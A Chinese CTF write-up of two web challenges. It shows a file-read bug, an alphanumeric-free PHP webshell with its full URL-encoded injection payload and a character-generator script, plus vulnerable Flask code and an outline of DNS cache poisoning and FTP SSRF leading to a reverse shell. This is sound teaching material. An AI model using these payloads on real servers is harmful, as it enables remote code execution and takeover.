##  Simple PHP

###  考点

1. 任意文件读取，获取源代码
2. 读取源代码后，向html文档里插入webshell
3. [无字母构造webshell](https://blog.csdn.net/unexpectedthing/article/details/120230159)

### wp

开始想着在登录注册界面去`SQL注入`，但是本题的目的不是为了拿数据库

我们自己注册登录进去后

点`好康的`，抓包，发现有个任意文件读取漏洞

![image-20220324151257010](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203241512136.png)



读取get_pic.php

```php
<?php
error_reporting(0);
$image = (string)$_GET['image'];
echo '<div class="img"> <img src="data:image/png;base64,' . base64_encode(file_get_contents($image)) . '" /> </div>';
?>
```

就是通过`image参数`和`file_get_contents`来读取文件内容。

读取index.php,base64解码后

```php
<?php
error_reporting(0);
if(isset($_POST['user']) && isset($_POST['pass'])){
	$hash_user = md5($_POST['user']);
	$hash_pass = 'zsf'.md5($_POST['pass']);
	if(isset($_POST['punctuation'])){
		//filter
		if (strlen($_POST['user']) > 6){
			echo("<script>alert('Username is too long!');</script>");
		}
		elseif(strlen($_POST['website']) > 25){
			echo("<script>alert('Website is too long!');</script>");
		}
		elseif(strlen($_POST['punctuation']) > 1000){
			echo("<script>alert('Punctuation is too long!');</script>");
		}
		else{
			if(preg_match('/[^\w\/\(\)\*<>]/', $_POST['user']) === 0){
				if (preg_match('/[^\w\/\*:\.\;\(\)\n<>]/', $_POST['website']) === 0){
					$_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>\?]/","",$_POST['punctuation']);
					$template = file_get_contents('./template.html');
					$content = str_replace("__USER__", $_POST['user'], $template);
					$content = str_replace("__PASS__", $hash_pass, $content);
					$content = str_replace("__WEBSITE__", $_POST['website'], $content);
					$content = str_replace("__PUNC__", $_POST['punctuation'], $content);
					file_put_contents('sandbox/'.$hash_user.'.php', $content);
					echo("<script>alert('Successed!');</script>");
				}
				else{
					echo("<script>alert('Invalid chars in website!');</script>");
				}
			}
			else{
				echo("<script>alert('Invalid chars in username!');</script>");
			}
		}
	}
	else{
		setcookie("user", $_POST['user'], time()+3600);
		setcookie("pass", $hash_pass, time()+3600);
		Header("Location:sandbox/$hash_user.php");
	}
}
?>



```

分析：`if`语句中，几个`str_replace`将我们输入的内容替换道`./template.html`,也就是`sandbox/c53001d04a23cf3376f85d56ef4d4b6f.php`,我们可控制参数是`user`,`pass`,`website`,`punctuation`,但是`user`和`pass`限制了长度太短了，所以考虑到直接用`punctuation`,长度比较长，加上可以利用`无字母数字`来绕过`preg_replace`

继续读源码

```
../../../../../../../var/www/html/sandbox/c53001d04a23cf3376f85d56ef4d4b6f.php   ---目录穿越来读
或者读取./template.html   --相对路径来读
```

![image-20220324161918629](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203241619908.png)



我们需要将`一句话木马`传到HTML文档

对于`user`参数，

```
/[^\w\/\(\)\*<>]/
```

如果赋值`/*`,就可以注释

![image-20220324170944879](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203241709094.png)

pass和website随便填一个。

`punctuation`,数字字母和？

```php
/[a-z,A-Z,0-9>\?]/
```

需要先闭合前面的`注释`，括号和分号

```
*/'');
```

![image-20220324171350018](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203241713237.png)

闭合后，就开始用`无字母数字写webshell`

脚本：利用异或构造字母

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: Y4tacker
# @Date:   2020-11-21 20:31:22
*/
//或
function orRce($par1, $par2){
    $result = (urldecode($par1)|urldecode($par2));
    return $result;
}

//异或
function xorRce($par1, $par2){
    $result = (urldecode($par1)^urldecode($par2));
    return $result;
}

//取反
function negateRce(){
    fwrite(STDOUT,'[+]your function: ');

    $system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

    fwrite(STDOUT,'[+]your command: ');

    $command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

    echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
}

//mode=1代表或，2代表异或，3代表取反
//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式
function generate($mode, $preg='/[0-9]/i'){
    if ($mode!=3){
        $myfile = fopen("rce.txt", "w");
        $contents = "";

        //为什么要256，因为我要构造%xx的url编码，突然发现url编码中%后的东西，都是16进制码。
        for ($i=0;$i<256;$i++){
            for ($j=0;$j<256;$j++){
                if ($i<16){
                    $hex_i = '0'.dechex($i);
                    //dechex()，将十进制转换为二进制
                    //至于为什么要加个0，因为后面%不能只有一位，必须两位，类似%xx。
                }else{
                    $hex_i = dechex($i);
                }
                if ($j<16){
                    $hex_j = '0'.dechex($j);
                }else{
                    $hex_j = dechex($j);
                }
                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    //hex2bin(),将16进制转换为ASCII码，
                    //bin2hex — 函数把包含数据的二进制字符串转换为十六进制值
                    echo "";
                }else{
                    $par1 = "%".$hex_i;
                    $par2 = '%'.$hex_j;
                    $res = '';
                    if ($mode==1){
                        $res = orRce($par1, $par2);
                    }else if ($mode==2){
                        $res = xorRce($par1, $par2);
                    }
                    if (ord($res)>=32&ord($res)<=126){
                        $contents=$contents.$res." ".$par1." ".$par2."\n";
                    }
                }
            }
        }
        fwrite($myfile,$contents);
        fclose($myfile);
    }else{
        negateRce();
    }
}
generate(2,'/[a-z,A-Z,0-9>\?]/');



```

也可以完全利用`$_`模式自增自减来构造无字母数字的webshell

见：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

```
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

punctuation最后面需要加个`/*`把后面的html注释掉

punctuation值：

```
*/);$_='';$_[+$_]++;$_=$_.'';$__=$_[+''];$_=$__;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*
```

然后urlencode

整体的payload：

```
user=/*&pass=1&website=1&punctuation=%2a%2f%29%3b%24%5f%3d%27%27%3b%24%5f%5b%2b%24%5f%5d%2b%2b%3b%24%5f%3d%24%5f%2e%27%27%3b%24%5f%5f%3d%24%5f%5b%2b%27%27%5d%3b%24%5f%3d%24%5f%5f%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b%2f%2a
```

然后登录进去

![image-20220324230434394](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203242304544.png)

抓包进行命令执行

![image-20220324230517269](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203242305366.png)

![image-20220324230535449](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203242305558.png)

##  NetworkTools--学习DNS缓存攻击



###  DNS解析链

**DNS介绍**

>**域名系统**（**D**omain **N**ame **S**ystem，缩写：**DNS**）是[互联网](https://zh.wikipedia.org/wiki/互联网)的一项服务。它作为将[域名](https://zh.wikipedia.org/wiki/域名)和[IP地址](https://zh.wikipedia.org/wiki/IP地址)相互[映射](https://zh.wikipedia.org/wiki/映射)的一个[分布式数据库](https://zh.wikipedia.org/wiki/分布式数据库)，能够使人更方便地访问[互联网](https://zh.wikipedia.org/wiki/互联网)。DNS使用[TCP](https://zh.wikipedia.org/wiki/传输控制协议)和[UDP](https://zh.wikipedia.org/wiki/用户数据报协议)[端口](https://zh.wikipedia.org/wiki/TCP/UDP端口列表)53[[1\]](https://zh.wikipedia.org/wiki/域名系统#cite_note-1)。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。通过主机名，得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）

**DNS解析**

>DNS查询有两种方式：**递归**和**迭代**。DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果。而DNS服务器之间一般采用迭代查询方式。
>
>以查询 zh.wikipedia.org 为例：
>
>- 客户端发送查询报文"query zh.wikipedia.org"至自身的DNS服务器，DNS服务器首先检查自身缓存，如果存在记录则直接返回结果。
>- 如果记录老化或不存在，则：
>  1. DNS服务器向[根域名服务器](https://zh.wikipedia.org/wiki/根網域名稱伺服器)发送查询报文"query zh.wikipedia.org"，根域名服务器返回[顶级域](https://zh.wikipedia.org/wiki/頂級域) .org 的顶级域名服务器地址。
>  2. DNS服务器向 .org 域的顶级域名服务器发送查询报文"query zh.wikipedia.org"，得到[二级域](https://zh.wikipedia.org/wiki/二级域) .wikipedia.org 的权威域名服务器地址。
>  3. DNS服务器向 .wikipedia.org 域的权威域名服务器发送查询报文"query zh.wikipedia.org"，得到主机 zh 的A记录，存入自身缓存并返回给客户端。

借用的图：DNS解析流程图

![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203250933209.png)



**DNS记录类型**

维基百科上的

>- 主机记录（A记录）：RFC 1035定义，A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。
>- 别名记录（CNAME记录）: RFC 1035定义，CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。
>- IPv6主机记录（AAAA记录）: RFC 3596定义，与A记录对应，用于将特定的主机名映射到一个主机的[IPv6](https://zh.wikipedia.org/wiki/IPv6)地址。
>- 服务位置记录（SRV记录）: RFC 2782定义，用于定义提供特定服务的服务器的位置，如主机（hostname），端口（port number）等。
>- 域名服务器记录（NS记录） ：用来指定该域名由哪个DNS服务器来进行解析。 您注册域名时，总有默认的DNS服务器，每个注册的域名都是由一个DNS域名服务器来进行解析的，DNS服务器NS记录地址一般以以下的形式出现： ns1.domain.com、ns2.domain.com等。 简单的说，NS记录是指定由哪个DNS服务器解析你的域名。
>- NAPTR记录：RFC 3403定义，它提供了[正则表达式](https://zh.wikipedia.org/wiki/正则表达式)方式去映射一个域名。NAPTR记录非常著名的一个应用是用于[ENUM](https://zh.wikipedia.org/w/index.php?title=ENUM&action=edit&redlink=1)查询

也可以看看这篇文章：https://blog.csdn.net/D_R_L_T/article/details/79634884

**容易出现的漏洞**

首先，我们将恶意字符编码为DNS记录的有效载荷。由攻击者的域名服务器提供的记录在攻击者控制的域下包含一个合法映射，但record被目标程序接受并处理时，获取到了错误子域的IP地址。此时，攻击者向解析器注入了大量伪造的响应，就会发生错误的IP解析从而导致注入攻击。

### DNS缓存攻击及利用方式

看这个https://xz.aliyun.com/t/11011#toc-2

### 考点

1.DNS缓存攻击

2.FTP的SSRF问题，跟之前的`WM`和`VN`CTF有一点点相似之处

###  wp

```python
from flask import Flask, request, send_from_directory,session
from flask_session import Session
from io import BytesIO
import re
import os
import ftplib
from hashlib import md5

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['SESSION_TYPE'] = 'filesystem'  
sess = Session()
sess.init_app(app)

def exec_command(cmd, addr):
    result = ''
    if re.match(r'^[a-zA-Z0-9.:-]+$', addr) != None:
        with os.popen(cmd % (addr)) as readObj:
            result = readObj.read()
    else:
        result = 'Invalid Address!'
    return result

@app.route("/")
def index():
    if not session.get('token'):
        token = md5(os.urandom(32)).hexdigest()[:8]
        session['token'] = token
    return send_from_directory('', 'index.html')

@app.route("/ping", methods=['POST'])
def ping():
    addr = request.form.get('addr', '')
    if addr == '':
        return 'Parameter "addr" Empty!'
    return exec_command("ping -c 3 -W 1 %s 2>&1", addr)

@app.route("/traceroute", methods=['POST'])
def traceroute():
    addr = request.form.get('addr', '')
    if addr == '':
        return 'Parameter "addr" Empty!'
    return exec_command("traceroute -q 1 -w 1 -n %s 2>&1", addr)

@app.route("/ftpcheck")
def ftpcheck():
    if not session.get('token'):
        return redirect("/")
    domain = session.get('token') + ".ftp.testsweb.xyz"
    file = 'robots.txt'
    fp = BytesIO()
    try:
        with ftplib.FTP(domain) as ftp:
            ftp.login("admin","admin")
            ftp.retrbinary('RETR ' + file, fp.write)
    except ftplib.all_errors as e:
        return 'FTP {} Check Error: {}'.format(domain,str(e))
    fp.seek(0)
    try:
        with ftplib.FTP(domain) as ftp:
            ftp.login("admin","admin")
            ftp.storbinary('STOR ' + file, fp)
    except ftplib.all_errors as e:
        return 'FTP {} Check Error: {}'.format(domain,str(e))
    fp.close()
    return 'FTP {} Check Success.'.format(domain)

@app.route("/shellcheck", methods=['POST'])
def shellcheck():
    if request.remote_addr != '127.0.0.1':
        return 'Localhost only'
    shell = request.form.get('shell', '')
    if shell == '':
        return 'Parameter "shell" Empty!'
    return str(os.system(shell))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)

```

其中关于python的FTP模块

```python
from ftplib import FTP 
ftp=FTP() #设置变量
ftp.set_debuglevel(2) #打开调试级别2，显示详细信息
ftp.connect("IP","port") #连接的ftp sever和端口
ftp.login("user","password")#连接的用户名，密码
print ftp.getwelcome() #打印出欢迎信息
ftp.cmd("xxx/xxx") #更改远程目录
bufsize=1024 #设置的缓冲区大小
filename="filename.txt" #需要下载的文件
file_handle=open(filename,"wb").write #以写模式在本地打开文件
ftp.retrbinaly("RETR filename.txt",file_handle,bufsize) #接收服务器上文件并写入本地文件
ftp.set_debuglevel(0) #关闭调试模式
ftp.quit #退出ftp
ftp相关命令操作
ftp.cwd(pathname) #设置FTP当前操作的路径
ftp.dir() #显示目录下文件信息
ftp.nlst() #获取目录下的文件
ftp.mkd(pathname) #新建远程目录
ftp.pwd() #返回当前所在位置
ftp.rmd(dirname) #删除远程目录
ftp.delete(filename) #删除远程文件
ftp.rename(fromname, toname)#将fromname修改名称为toname。
ftp.storbinaly("STOR filename.txt",file_handel,bufsize) #上传目标文件
ftp.retrbinary("RETR filename.txt",file_handel,bufsize)#下载FTP文件
```

看这篇https://blog.csdn.net/cosmoslin/article/details/123287265?spm=1001.2014.3001.5502

我的理解是

>DNS缓存污染
>
>先根据一个权威的DNS服务器，将`a.testsweb.xyz`的域名指定`b.testsweb.xyz`的DNS服务器解析，然后将`a.testweb.xyz`的A记录指向自己的服务器IP，只要查询一下`ftp.a.testweb.xyz`，就会命中DNS Forwarder的缓存，`token.ftp.testweb.xyz`DNS缓存就会污染为我们服务器IP。
>
>SSRF:`token.ftp.testweb.xyz`，会映射到我们自己的ip地址上，然后会执行将服务器上的文件下载到本地，这就触发了我们ip地址上的FTP，恶意FTP会将payload打在本地上的`RETRrobots.txt`上，然后就触发`反弹shell`,自己监听就可以成功反弹了。
>
>









